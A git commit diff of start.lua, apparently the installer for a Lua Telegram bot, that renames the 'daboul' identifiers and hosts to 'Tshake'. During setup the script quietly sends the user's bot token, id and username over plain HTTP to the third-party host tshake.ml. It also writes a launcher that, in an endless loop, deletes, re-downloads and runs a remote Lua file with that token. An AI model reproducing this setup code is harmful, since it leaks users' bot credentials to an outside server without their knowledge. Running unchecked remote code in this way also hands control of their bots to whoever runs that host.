96e7aea2370459e4667e0be30f9d8a5059f6427b
daboulBot <72452213+daboulBot@users.noreply.github.com>
2020-10-06 17:02:23 +0300

    Add files via upload

--- start.lua
+++ start.lua
@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_daboul = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_daboul = function() 
+Server_Tshake = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_Tshake = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local daboul_Info_Sudo = io.open("sudo.lua", 'w')
-daboul_Info_Sudo:write([[
+local Tshake_Info_Sudo = io.open("sudo.lua", 'w')
+Tshake_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-daboul_Info_Sudo:close()
+Tshake_Info_Sudo:close()
 end  
-if not database:get(Server_daboul.."Token_daboul") then
+if not database:get(Server_Tshake.."Token_Tshake") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_daboul.."Token_daboul",token)
+database:set(Server_Tshake.."Token_Tshake",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,11 +34,11 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_daboul.."UserName_daboul") then
+if not database:get(Server_Tshake.."UserName_Tshake") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://daboul.ml/info/?user="..UserName)
+local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_daboul.."UserName_daboul",Json.Info.Username)
-database:set(Server_daboul.."Id_daboul",Json.Info.Id)
+database:set(Server_Tshake.."UserName_Tshake",Json.Info.Username)
+database:set(Server_Tshake.."Id_Tshake",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_daboul_Info()
-Create_Info(database:get(Server_daboul.."Token_daboul"),database:get(Server_daboul.."Id_daboul"),database:get(Server_daboul.."UserName_daboul"))   
-http.request("http://daboul.ml/add/?id="..database:get(Server_daboul.."Id_daboul").."&user="..database:get(Server_daboul.."UserName_daboul").."&token="..database:get(Server_daboul.."Token_daboul"))
-local Rundaboul = io.open("daboul", 'w')
-Rundaboul:write([[
+local function Files_Tshake_Info()
+Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
+http.request("http://tshake.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
+local RunTshake = io.open("Tshake", 'w')
+RunTshake:write([[
 #!/usr/bin/env bash
-cd $HOME/daboul
-token="]]..database:get(Server_daboul.."Token_daboul")..[["
-rm -fr daboul.lua
-wget "https://raw.githubusercontent.com/daboulab/daboul/master/daboul.lua"
+cd $HOME/TshAkE
+token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
+rm -fr Tshake.lua
+wget "https://raw.githubusercontent.com/tshakeab/Tshake/master/Tshake.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./daboul.lua -p PROFILE --bot=$token
+./tg -s ./Tshake.lua -p PROFILE --bot=$token
 done
 ]])
-Rundaboul:close()
+RunTshake:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/daboul
+cd $HOME/TshAkE
 while(true) do
 rm -fr ../.telegram-cli
-screen -S daboul -X kill
-screen -S daboul ./daboul
+screen -S TshAkE -X kill
+screen -S TshAkE ./Tshake
 done
 ]])
 RunTs:close()
 end
-Files_daboul_Info()
-database:del(Server_daboul.."Token_daboul");database:del(Server_daboul.."Id_daboul");database:del(Server_daboul.."UserName_daboul")
+Files_Tshake_Info()
+database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_daboul()  
+AutoFiles_Tshake()  
 var = true
 else   
 f:close()  
-database:del(Server_daboul.."Token_daboul");database:del(Server_daboul.."Id_daboul");database:del(Server_daboul.."UserName_daboul")
+database:del(Server_Tshake.."Token_Tshake");database:del(Server_Tshake.."Id_Tshake");database:del(Server_Tshake.."UserName_Tshake")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
